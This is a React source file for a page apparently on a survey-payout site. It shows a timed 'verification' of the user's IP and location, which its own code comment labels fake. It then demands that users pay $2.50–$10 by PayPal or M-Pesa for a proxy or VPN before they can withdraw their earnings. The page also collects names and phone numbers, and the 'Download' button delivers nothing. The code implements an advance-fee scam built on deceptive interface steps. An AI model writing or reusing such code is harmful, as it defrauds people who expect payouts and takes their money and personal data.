import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/GeoWarning.css";

import dcProxyImg from "../assets/us-proxy.png";
import resProxyImg from "../assets/residential-proxy.png";
import catoVpnImg from "../assets/cato-vpn.png";

export default function GeoWarning() {
  const navigate = useNavigate();
  const RATE = 125;

  const [checking, setChecking] = useState(true);
  const [stepIndex, setStepIndex] = useState(0);
  const [purchasedProxy, setPurchasedProxy] = useState(null);

  // Modal states
  const [modalOpen, setModalOpen] = useState(false);
  const [checkout, setCheckout] = useState(null);
  const [form, setForm] = useState({ name: "", phone: "", reference: "" });
  const [paymentStatus, setPaymentStatus] = useState(null);
  const [transactionRef, setTransactionRef] = useState(null);

  const steps = [
    "Obtaining IP address…",
    "Checking geolocation…",
    "Verifying eligibility…",
    "Verification completed",
  ];

  // Fake verification loader
  useEffect(() => {
    const t = setInterval(() => {
      setStepIndex((i) => (i < steps.length - 1 ? i + 1 : i));
    }, 1500);

    setTimeout(() => {
      setChecking(false);
      clearInterval(t);
    }, 7000);

    return () => clearInterval(t);
  }, []);

  /* -------- PayPal Buttons -------- */
  useEffect(() => {
    if (window.paypal) return;

    const script = document.createElement("script");
    script.src =
      "https://www.paypal.com/sdk/js?client-id=Abvr9JQwh4aABOQkIoz7Dn8kcjEaPHlDV49WPqUUR3YfKSvqYF5TBcQj6WiqsAFajtSudQfHugP0tbz8&currency=USD";
    script.async = true;

    script.onload = () => {
      ["5", "10", "2-5"].forEach((id, i) => {
        const values = ["5.00", "10.00", "2.50"];
        const types = ["dc", "residential", "cato"];

        window.paypal.Buttons({
          createOrder: (_, actions) =>
            actions.order.create({
              purchase_units: [{ amount: { value: values[i] } }],
            }),
          onApprove: (_, actions) =>
            actions.order.capture().then(() => setPurchasedProxy(types[i])),
        }).render(`#paypal-${id}`);
      });
    };

    document.body.appendChild(script);
  }, []);

  // Format phone number
  const formatPhone = (phone) => {
    if (!phone) return "";
    if (phone.startsWith("0")) return "254" + phone.slice(1);
    if (phone.startsWith("7")) return "254" + phone;
    return phone;
  };

  // Trigger modal when "Pay with M-Pesa" clicked
  const openModal = (type, usd) => {
    setCheckout({ type, usd });
    setForm({ name: "", phone: "", reference: "" });
    setPaymentStatus(null);
    setModalOpen(true);
  };

  // Handle STK push
  const handleSTKPush = async () => {
    if (!form.name || !form.phone) return alert("Fill all fields");

    const formattedPhone = formatPhone(form.phone);
    localStorage.setItem("phone", form.phone);

    setPaymentStatus("processing");

    try {
      const res = await fetch(
        "https://usaas-survey-bc.onrender.com/api/payments/stk-push",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            phone: formattedPhone,
            product: checkout.type,
            reference: form.reference || `REF_${Date.now()}`,
          }),
        }
      );

      const data = await res.json();

      if (data.success) {
        setTransactionRef(data.reference);
        setPaymentStatus("pending");
      } else {
        setPaymentStatus("failed");
      }
    } catch {
      setPaymentStatus("failed");
    }
  };

  // Poll STK status
  useEffect(() => {
    if (paymentStatus !== "pending") return;

    const interval = setInterval(async () => {
      const res = await fetch(
        `https://usaas-survey-bc.onrender.com/api/payments/status/${transactionRef}`
      );
      const data = await res.json();

      if (data.status === "success") {
        setPaymentStatus("success");
        setPurchasedProxy(data.product);
        clearInterval(interval);
      } else if (data.status === "failed") {
        setPaymentStatus("failed");
        clearInterval(interval);
      }
    }, 4000);

    return () => clearInterval(interval);
  }, [paymentStatus]);

  const handleProceedWithdraw = () => {
    if (!purchasedProxy) return alert("Purchase required");
    navigate("/withdrawp");
  };

  const DownloadLink = () =>
    purchasedProxy ? (
      <button className="download-link active">⬇ Download</button>
    ) : (
      <span className="download-link locked">Locked</span>
    );

  const calcKES = checkout ? Math.round(checkout.usd * RATE) : 0;

  return (
    <div className="geo-page">
      <div className="geo-card">

        {/* Loader */}
        {checking && (
          <div className="checking-overlay">
            <div className="checking-box">
              <div className="spinner" />
              <p>{steps[stepIndex]}</p>
            </div>
          </div>
        )}

        <div className={`geo-content ${checking ? "blurred" : ""}`}>
          <h1>⚠ Purchase Proxy to Withdraw</h1>

          <div className="proxy-list">

            {/* Datacenter */}
            <div className="proxy-card">
              <img src={dcProxyImg} alt="" />
              <DownloadLink />
              <h3>Datacenter Proxy</h3>
              <p>$5 (~KES {5 * RATE})</p>
              <div id="paypal-5" />
              <button
                className="mpesa-btn"
                onClick={() => openModal("dc", 5)}
              >
                📲 Pay with M-Pesa
              </button>
            </div>

            {/* Residential */}
            <div className="proxy-card premium">
              <img src={resProxyImg} alt="" />
              <DownloadLink />
              <h3>Residential Proxy</h3>
              <p>$10 (~KES {10 * RATE})</p>
              <div id="paypal-10" />
              <button
                className="mpesa-btn"
                onClick={() => openModal("residential", 10)}
              >
                📲 Pay with M-Pesa
              </button>
            </div>

            {/* VPN */}
            <div className="proxy-card">
              <img src={catoVpnImg} alt="" />
              <DownloadLink />
              <h3>VPN</h3>
              <p>$2.5 (~KES {2.5 * RATE})</p>
              <div id="paypal-2-5" />
              <button
                className="mpesa-btn"
                onClick={() => openModal("cato", 2.5)}
              >
                📲 Pay with M-Pesa
              </button>
            </div>
          </div>

          {!checking && (
            <button className="withdraw-btn" onClick={handleProceedWithdraw}>
              Proceed Withdraw
            </button>
          )}
        </div>
      </div>

      {/* STK Payment Modal */}
      {modalOpen && (
        <div className="checkout-modal">
          <div className="checkout-box">
            {checkout && (
              <>
                <h2>💳 Pay with M-Pesa</h2>
                <p>Check your phone to complete the payment</p>
                <input
                  placeholder="Name"
                  value={form.name}
                  onChange={(e) => setForm({ ...form, name: e.target.value })}
                />
                <input
                  placeholder="07XXXXXXXX"
                  value={form.phone}
                  onChange={(e) => setForm({ ...form, phone: e.target.value })}
                />
                <input
                  placeholder="Reference (optional)"
                  value={form.reference}
                  onChange={(e) => setForm({ ...form, reference: e.target.value })}
                />

                <div className="amount-box">
                  <h2>KES {calcKES}</h2>
                  <span>${checkout.usd} × {RATE}</span>
                </div>

                <button className="pay-btn" onClick={handleSTKPush}>
                  Pay Now
                </button>
                <button className="cancel-btn" onClick={() => setModalOpen(false)}>
                  Cancel
                </button>
              </>
            )}

            {paymentStatus && (
              <>
                {paymentStatus === "processing" && <h2>⏳ Processing...</h2>}
                {paymentStatus === "pending" && (
                  <>
                    <h2>📲 Waiting for payment</h2>
                    <p>Check your phone to complete the transaction</p>
                  </>
                )}
                {paymentStatus === "success" && <h2>✅ Payment Successful</h2>}
                {paymentStatus === "failed" && <h2>❌ Payment Failed</h2>}
                <button onClick={() => {setPaymentStatus(null); setModalOpen(false)}}>Close</button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
